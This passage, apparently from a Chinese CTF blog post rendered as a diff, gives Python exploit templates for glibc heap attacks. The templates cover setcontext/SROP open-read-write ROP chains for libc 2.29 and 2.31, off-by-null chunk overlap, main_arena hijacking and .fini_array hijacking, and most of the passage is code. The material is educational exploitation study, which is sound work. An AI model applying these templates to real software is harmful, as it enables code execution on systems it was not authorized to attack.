+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdx_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>fake_rsp<span class="token operator">+</span><span class="token number">0x100</span><span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdx_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>fake_rsp<span class="token operator">+</span><span class="token number">0x100</span><span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+add<span class="token punctuation">(</span><span class="token number">0x400</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#10</span>
+free<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>
+</code></pre>
+<p>再说2.29的orw</p>
+<p>2.29的setcontext如下</p>
+<pre class=" language-assembly"><code class="language-assembly">0x7ffff7e36e00 <setcontext>:    push   rdi
+0x7ffff7e36e01 <setcontext+1>:    lea    rsi,[rdi+0x128]
+0x7ffff7e36e08 <setcontext+8>:    xor    edx,edx
+0x7ffff7e36e0a <setcontext+10>:    mov    edi,0x2
+0x7ffff7e36e0f <setcontext+15>:    mov    r10d,0x8
+0x7ffff7e36e15 <setcontext+21>:    mov    eax,0xe
+0x7ffff7e36e1a <setcontext+26>:    syscall 
+0x7ffff7e36e1c <setcontext+28>:    pop    rdx
+0x7ffff7e36e1d <setcontext+29>:    cmp    rax,0xfffffffffffff001
+0x7ffff7e36e23 <setcontext+35>:    jae    0x7ffff7e36e80 <setcontext+128>
+0x7ffff7e36e25 <setcontext+37>:    mov    rcx,QWORD PTR [rdx+0xe0]
+0x7ffff7e36e2c <setcontext+44>:    fldenv [rcx]
+0x7ffff7e36e2e <setcontext+46>:    ldmxcsr DWORD PTR [rdx+0x1c0]
+0x7ffff7e36e35 <setcontext+53>:    mov    rsp,QWORD PTR [rdx+0xa0]
+0x7ffff7e36e3c <setcontext+60>:    mov    rbx,QWORD PTR [rdx+0x80]
+0x7ffff7e36e43 <setcontext+67>:    mov    rbp,QWORD PTR [rdx+0x78]
+0x7ffff7e36e47 <setcontext+71>:    mov    r12,QWORD PTR [rdx+0x48]
+0x7ffff7e36e4b <setcontext+75>:    mov    r13,QWORD PTR [rdx+0x50]
+0x7ffff7e36e4f <setcontext+79>:    mov    r14,QWORD PTR [rdx+0x58]
+0x7ffff7e36e53 <setcontext+83>:    mov    r15,QWORD PTR [rdx+0x60]
+0x7ffff7e36e57 <setcontext+87>:    mov    rcx,QWORD PTR [rdx+0xa8]
+0x7ffff7e36e5e <setcontext+94>:    push   rcx
+0x7ffff7e36e5f <setcontext+95>:    mov    rsi,QWORD PTR [rdx+0x70]
+0x7ffff7e36e63 <setcontext+99>:    mov    rdi,QWORD PTR [rdx+0x68]
+0x7ffff7e36e67 <setcontext+103>:    mov    rcx,QWORD PTR [rdx+0x98]
+0x7ffff7e36e6e <setcontext+110>:    mov    r8,QWORD PTR [rdx+0x28]
+0x7ffff7e36e72 <setcontext+114>:    mov    r9,QWORD PTR [rdx+0x30]
+0x7ffff7e36e76 <setcontext+118>:    mov    rdx,QWORD PTR [rdx+0x88]
+0x7ffff7e36e7d <setcontext+125>:    xor    eax,eax
+0x7ffff7e36e7f <setcontext+127>:    ret    
+0x7ffff7e36e80 <setcontext+128>:    mov    rcx,QWORD PTR [rip+0x18dfe9]        # 0x7ffff7fc4e70
+0x7ffff7e36e87 <setcontext+135>:    neg    eax
+0x7ffff7e36e89 <setcontext+137>:    mov    DWORD PTR fs:[rcx],eax
+0x7ffff7e36e8c <setcontext+140>:    or     rax,0xffffffffffffffff
+0x7ffff7e36e90 <setcontext+144>:    ret    
+</code></pre>
+<p>libc2.29下的setcontext和2.27的区别在于setcontext+53处的代码是将rdx+0xa0处的值赋给了rsp，而不是rdi，因此我们需要一个gadget来操纵rdx</p>
+<p>在libc2.29中有这样一条gadget</p>
+<pre class=" language-assembly"><code class="language-assembly">0x000000000012be97: 
+mov rdx, qword ptr [rdi + 8]; 
+mov rax, qword ptr [rdi]; 
+mov rdi, rdx; 
+jmp rax;</code></pre>
+<p>当我们free某个chunk时，rdi即为这个chunk的地址，我们将[rdi+8]设置为伪造的rsp的地址，在其中布置好各个寄存器的参数以及orw的rop链；将[rdi]设置为setcontext+0x1d的地址。</p>
+<p>模板如下</p>
+<pre class=" language-python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>
+add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>
+add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>
+add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>
+frame <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>
+frame<span class="token punctuation">.</span>rdi <span class="token operator">=</span> heap_addr <span class="token operator">+</span> <span class="token number">0x1b50</span> <span class="token operator">+</span> <span class="token number">0x100</span> <span class="token operator">+</span> <span class="token number">0x100</span>
+frame<span class="token punctuation">.</span>rsi <span class="token operator">=</span> <span class="token number">0</span>
+frame<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">0x100</span>
+frame<span class="token punctuation">.</span>rsp <span class="token operator">=</span> heap_addr <span class="token operator">+</span> <span class="token number">0x1b50</span> <span class="token operator">+</span> <span class="token number">0x100</span>
+frame<span class="token punctuation">.</span>rip <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x000000000002535f</span> <span class="token comment" spellcheck="true"># : ret</span>
+frame<span class="token punctuation">.</span>set_regvalue<span class="token punctuation">(</span><span class="token string">'&amp;fpstate'</span><span class="token punctuation">,</span> heap_addr<span class="token punctuation">)</span>
+
+str_frame <span class="token operator">=</span> str<span class="token punctuation">(</span>frame<span class="token punctuation">)</span>
+payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'setcontext'</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">0x1d</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>heap_addr <span class="token operator">+</span> <span class="token number">0x1b50</span><span class="token punctuation">)</span> <span class="token operator">+</span> str_frame<span class="token punctuation">[</span><span class="token number">0x10</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
+
+layout <span class="token operator">=</span> <span class="token punctuation">[</span>
+    libc_base <span class="token operator">+</span> <span class="token number">0x0000000000047cf8</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#: pop rax; ret; </span>
+    <span class="token number">2</span><span class="token punctuation">,</span>
+    <span class="token comment" spellcheck="true"># sys_open("./flag", 0)</span>
+    libc_base <span class="token operator">+</span> <span class="token number">0x00000000000cf6c5</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#: syscall; ret; </span>
+
+    libc_base <span class="token operator">+</span> <span class="token number">0x0000000000026542</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#: pop rdi; ret; </span>
+    <span class="token number">3</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true"># maybe it is 2</span>
+    libc_base <span class="token operator">+</span> <span class="token number">0x0000000000026f9e</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#: pop rsi; ret; </span>
+    heap_addr <span class="token operator">+</span> <span class="token number">0x10000</span><span class="token punctuation">,</span>
+    libc_base <span class="token operator">+</span> <span class="token number">0x000000000012bda6</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#: pop rdx; ret; </span>
+    <span class="token number">0x100</span><span class="token punctuation">,</span>
+    libc_base <span class="token operator">+</span> <span class="token number">0x0000000000047cf8</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#: pop rax; ret; </span>
+    <span class="token number">0</span><span class="token punctuation">,</span>
+    <span class="token comment" spellcheck="true"># sys_read(flag_fd, heap, 0x100)</span>
+    libc_base <span class="token operator">+</span> <span class="token number">0x00000000000cf6c5</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#: syscall; ret; </span>
+
+    libc_base <span class="token operator">+</span> <span class="token number">0x0000000000026542</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#: pop rdi; ret; </span>
+    <span class="token number">1</span><span class="token punctuation">,</span>
+    libc_base <span class="token operator">+</span> <span class="token number">0x0000000000026f9e</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#: pop rsi; ret; </span>
+    heap_addr <span class="token operator">+</span> <span class="token number">0x10000</span><span class="token punctuation">,</span>
+    libc_base <span class="token operator">+</span> <span class="token number">0x000000000012bda6</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#: pop rdx; ret; </span>
+    <span class="token number">0x100</span><span class="token punctuation">,</span>
+    libc_base <span class="token operator">+</span> <span class="token number">0x0000000000047cf8</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#: pop rax; ret; </span>
+    <span class="token number">1</span><span class="token punctuation">,</span>
+    <span class="token comment" spellcheck="true"># sys_write(1, heap, 0x100)</span>
+    libc_base <span class="token operator">+</span> <span class="token number">0x00000000000cf6c5</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#: syscall; ret; </span>
+
+    libc_base <span class="token operator">+</span> <span class="token number">0x0000000000026542</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#: pop rdi; ret; </span>
+    <span class="token number">0</span><span class="token punctuation">,</span>
+    libc_base <span class="token operator">+</span> <span class="token number">0x0000000000047cf8</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#: pop rax; ret; </span>
+    <span class="token number">231</span><span class="token punctuation">,</span>
+    <span class="token comment" spellcheck="true"># exit(0)</span>
+    libc_base <span class="token operator">+</span> <span class="token number">0x00000000000cf6c5</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#: syscall; ret; </span>
+<span class="token punctuation">]</span>
+payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token operator">+</span> flat<span class="token punctuation">(</span>layout<span class="token punctuation">)</span>
+payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'./flag'</span>
+add<span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
+<span class="token keyword">print</span> payload
+free<span class="token punctuation">(</span><span class="token number">37</span><span class="token punctuation">)</span></code></pre>
+<p>最后是libc2.31的orw</p>
+<p>由于2.29出题麻烦，所以目前大部分都是2.31的题目</p>
+<p>2.31的setcontext和2.29一样，只是用来操纵rdx的gadget有所区别</p>
+<p>如下</p>
+<pre class=" language-assembly"><code class="language-assembly">0x0000000000154930: 
+mov rdx, qword ptr [rdi + 8]; 
+mov qword ptr [rsp], rax; 
+call qword ptr [rdx + 0x20];</code></pre>
+<p>也就是在rdi+8的位置处放frame的地址，在frame+0x20处放setcontext的地址</p>
+<p>模板如下</p>
+<pre class=" language-python"><code class="language-python">edit<span class="token punctuation">(</span><span class="token number">27</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>
+edit<span class="token punctuation">(</span><span class="token number">23</span><span class="token punctuation">,</span> <span class="token string">'./flag\x00\x00'</span><span class="token punctuation">)</span>
+
+frame <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>
+frame<span class="token punctuation">.</span>rax <span class="token operator">=</span> <span class="token number">0</span>
+frame<span class="token punctuation">.</span>rdi <span class="token operator">=</span> <span class="token number">0</span>
+frame<span class="token punctuation">.</span>rsi <span class="token operator">=</span> heap_orw
+frame<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">0x1000</span>
+frame<span class="token punctuation">.</span>rsp <span class="token operator">=</span> heap_orw
+frame<span class="token punctuation">.</span>rip <span class="token operator">=</span> syscall
+str_frame <span class="token operator">=</span> str<span class="token punctuation">(</span>frame<span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#setcontext = libc_base + libc.sym['setcontext'] + 61</span>
+p <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>setcontext<span class="token punctuation">)</span>
+edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> p<span class="token operator">+</span>str_frame<span class="token punctuation">[</span><span class="token number">0x28</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+
+p <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>frame_addr<span class="token punctuation">)</span>
+
+p2 <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>Open<span class="token punctuation">)</span>
+p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>heap_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>Read<span class="token punctuation">)</span>
+p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>heap_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>Write<span class="token punctuation">)</span>
+
+edit<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>
+free<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>
+sl<span class="token punctuation">(</span>p2<span class="token punctuation">)</span></code></pre>
+<h2 id="0xF-off-by-null"><a href="#0xF-off-by-null" class="headerlink" title="0xF.off-by-null"></a>0xF.off-by-null</h2><p>1.shrink the chunk</p>
+<pre class=" language-python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#1</span>
+add<span class="token punctuation">(</span><span class="token number">0x1e0</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#2</span>
+add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#3</span>
+dele<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#chunk2进入unsortedbin，chunk3的prvesize为0x1f0</span>
+dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#1 off-by-null,chunk2的size变为0x100,chunk3的size依然为0x1f0</span>
+add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#2从unsortedbin切割</span>
+add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#4从unsortedbin切割</span>
+dele<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
+dele<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#chunk3根据prevsize找到chunk1，chunk1为free状态，触发合并，于是chunk4处于复用状态</span></code></pre>
+<p>以上是2.23的利用方法，如果是2.27的版本则需要将tcache填满</p>
+<p>注意，可能需要<strong>伪造chunk</strong>来绕过检查</p>
+<p>2.普通的off-by-null</p>
+<pre class=" language-python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0xf8</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#1</span>
+add<span class="token punctuation">(</span><span class="token number">0xf8</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#2</span>
+add<span class="token punctuation">(</span><span class="token number">0xf8</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#3</span>
+add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#4</span>
+dele<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
+add<span class="token punctuation">(</span><span class="token number">0xf8</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0xf0</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#2 off-by-null chunk3,chunk3的size的isuse位被置0，prevsize被设置为chunk1+chunk2</span>
+dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+dele<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#chunk3被free，根据prevsize找到chunk1，chunk1被free，触发合并，chunk2处于复用状态</span></code></pre>
+<p>3.以上两种方法只适用于2.23及2.27，2.29及以上版本增加了检查，直接修改size和prvesize不再适用，需要借用largebin的残留指针来操作。</p>
+<p>借用一张图</p>
+<p><a href="https://imgchr.com/i/slP3j0" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/10/slP3j0.png" alt="slP3j0.png"></a></p>
+<p>构造模板如下</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token string">'chunk_'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span><span class="token number">64</span><span class="token operator">+</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'n'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#用于填充tcache</span>
+
+add<span class="token punctuation">(</span><span class="token number">0x5a8</span><span class="token punctuation">,</span><span class="token string">'pad'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#使堆地址对齐</span>
+add<span class="token punctuation">(</span><span class="token number">0x5e0</span><span class="token punctuation">,</span><span class="token string">'chunk_72'</span> <span class="token operator">+</span> <span class="token string">'n'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#largebin</span>
+add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">'chunk_73'</span> <span class="token operator">+</span> <span class="token string">'n'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#防止largebin被topchunk合并</span>
+delete<span class="token punctuation">(</span><span class="token number">72</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#dele掉0x5e0的chunk，进入unsortedbin</span>
+add<span class="token punctuation">(</span><span class="token number">0x618</span><span class="token punctuation">,</span><span class="token string">'chunk_72'</span> <span class="token operator">+</span> <span class="token string">'n'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#申请一个大于0x5e0的chunk，使其进入largebin，堆上留下了残留指针</span>
+
+add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xe1</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#chunk0 从largebin切割，在其中伪造一个0xe1的chunk，将fakechunk的fd指向chunk3</span>
+add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token string">'chunk_75'</span> <span class="token operator">+</span> <span class="token string">'n'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#chunk1</span>
+add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token string">'chunk_76'</span> <span class="token operator">+</span> <span class="token string">'n'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#chunk2</span>
+add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token string">'chunk_77'</span> <span class="token operator">+</span> <span class="token string">'n'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#chunk3</span>
+add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token string">'chunk_78'</span> <span class="token operator">+</span> <span class="token string">'n'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#chunk4 剩下0x500的unsortedbin</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    delete<span class="token punctuation">(</span><span class="token number">64</span><span class="token operator">+</span>i<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#将tcache填满</span>
+delete<span class="token punctuation">(</span><span class="token number">75</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#free chunk1 进入fastbin</span>
+delete<span class="token punctuation">(</span><span class="token number">77</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#free chunk3 ，使chunk3的fd指针上留下堆指针</span>
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token string">'chunk_'</span><span class="token operator">+</span>str<span class="token punctuation">(</span><span class="token number">64</span><span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'n'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#将tcache清空</span>
+add<span class="token punctuation">(</span><span class="token number">0x618</span><span class="token punctuation">,</span><span class="token string">'chunk_75'</span> <span class="token operator">+</span> <span class="token string">'n'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#将unsortedbin放入largebin</span>
+add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token string">'b'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#使chunk3的bk指针指向chunk0</span>
+add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token string">'chunk_1'</span><span class="token punctuation">)</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">#将tcache填满</span>
+    delete<span class="token punctuation">(</span><span class="token number">64</span><span class="token operator">+</span>i<span class="token punctuation">)</span>
+delete<span class="token punctuation">(</span><span class="token number">78</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#free chunk4</span>
+delete<span class="token punctuation">(</span><span class="token number">74</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#free chunk0 使chunk0的fd上留下堆指针</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token string">'chunk_'</span><span class="token operator">+</span>str<span class="token punctuation">(</span><span class="token number">64</span><span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'n'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#将tcache清空</span>
+add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span>p8<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#将chunk0的fd指针指向fakechunk</span>
+add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xe0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#伪造chunk5的presize为fakechunk的size，并off-by-null，置chunk5的inuse位为0</span>
+add<span class="token punctuation">(</span><span class="token number">0x4f8</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#将chunk5申请回来</span>
+delete<span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#将chunk5 free，触发合并</span></code></pre>
+<p>由于我们需要堆地址为<code>0x????????????0???</code>，即倒数第四位为0，所以概率为1/16</p>
+<p>构造完成后就是下面的情况</p>
+<p><a href="https://imgchr.com/i/slFBm6" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/10/slFBm6.png" alt="slFBm6.png"></a></p>
+<h2 id="0x10-main-arena打击"><a href="#0x10-main-arena打击" class="headerlink" title="0x10.main_arena打击"></a>0x10.main_arena打击</h2><p>堆题目中可以尝试劫持main_arena</p>
+<p>分情况，如果能分配0x68的chunk的话，就可以直接往main_arena上错位分配，找个0x7f地址开头的，就可以申请过去了，接着修改main_arena+88处的值，这里是存放topchunk地址的位置，我们可以将其修改为malloc_hook上方一点的位置，接着继续申请chunk就能分配到malloc_hook了；如果要劫持free_hook的话要麻烦些，需要把main_arena劫持到free_hook上方一段距离，然后一直申请chunk才能分配到free_hook；如果分配不了0x68的chunk，但可以分配0x40的chunk，可以伪造一个大一点的chunk，如0x70的，再将其free掉，然后在main_arena中就会记录下这个0x70的chunk的地址，堆地址开头可能为0x55或者0x56，如果为0x56的话，我们再进行错位申请就可以申请到main_arena去，接着修改main_arena+88的值即可。</p>
+<h2 id="0x11-fini-array劫持"><a href="#0x11-fini-array劫持" class="headerlink" title="0x11. .fini_array劫持"></a>0x11. .fini_array劫持</h2><p>Linux下c程序的运行顺序如下</p>
+<pre><code>_start---&gt;__libc_start_main_---&gt;init---&gt;main---&gt;fini</code></pre><p><a href="https://imgchr.com/i/ypVBxU" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/28/ypVBxU.png" alt="ypVBxU.png"></a></p>
+<p>init会执行.init_array数组内的函数，fini会执行.fini_array数组内的函数，在IDA内按ctrl+s可以看到这两个数组的地址</p>
